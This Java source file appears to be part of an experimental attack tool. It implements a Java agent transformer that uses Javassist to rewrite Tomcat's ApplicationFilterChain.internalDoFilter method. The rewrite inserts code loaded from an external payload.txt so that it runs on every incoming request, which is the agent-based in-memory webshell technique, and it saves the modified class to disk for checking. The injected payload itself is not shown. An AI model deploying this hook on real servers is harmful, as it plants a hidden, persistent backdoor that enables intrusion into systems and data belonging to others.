package com.loki.JavaAgent;

import javassist.*;
import java.io.*;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;
/*
 * 注意:此实验版本为apache-tomcat-8.5.45,由于tomcat版本不同，ApplicationFilterChain类名可能不同，请自行修改。
 *
 */
public class MyTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")) { // class from in jvm named as xxx/xxx/xxx/xxx
            try {
               System.out.println("a request come and hook the ApplicationFilterChain");
                if (classBeingRedefined != null) {
                    System.out.println("classBeingRedefined is :" + classBeingRedefined.getName());
                } else {
                    System.out.println("classBeingRedefined is null!");
                }
                ClassPool classPool = ClassPool.getDefault();
                ClassClassPath classPath = new ClassClassPath(className.getClass());  //get className class's classpath
                System.out.println("this class path :"+classPath.toString());
                classPool.insertClassPath(classPath);  //add the classpath to classpool  To nextfind
                System.out.println("classPool has :"+classPool.toString());
                if (classBeingRedefined != null)
                {
                    ClassClassPath classPath1 = new ClassClassPath(classBeingRedefined);
                    classPool.insertClassPath(classPath1);
                }
                System.out.println("classPool1 has :"+classPool.toString());
                CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");
                if (ctClass.isFrozen()) {
                    ctClass.defrost();
                }
                CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");//filterchain dofilter actually implementation ,change it'code and for all request
                ctMethod.addLocalVariable("elapsedTime", CtClass.longType);
                ctMethod.insertBefore(readSource());

                byte[] classbytes = ctClass.toBytecode();//get changed code and return ,Notice after the method of toBytecode,the ctClass will be forzen
                bytestoclass(classbytes, ".\\changed_by_loki\\retransformed.class");//get changed class for check
                return classbytes;

            }/**/ catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }
    private String readSource() {
        StringBuilder source = new StringBuilder();
        InputStream is = MyTransformer.class.getClassLoader().getResourceAsStream("payload.txt");
        if (is == null) {
            System.out.println("payload.txt not found");
            throw new IllegalStateException("Resource not found: /payload.txt");
        }
        InputStreamReader isr = new InputStreamReader(is);
        String line = null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                source.append(line).append("\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println(source.toString());
        return source.toString();
    }
    private void bytestoclass(byte[] bytes, String filename) {
        try {
            File file = new File(".\\changed_by_loki");
            if (!file.exists())
                file.mkdir();
            FileOutputStream fos = new FileOutputStream(filename);
            fos.write(bytes);
            fos.flush();
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
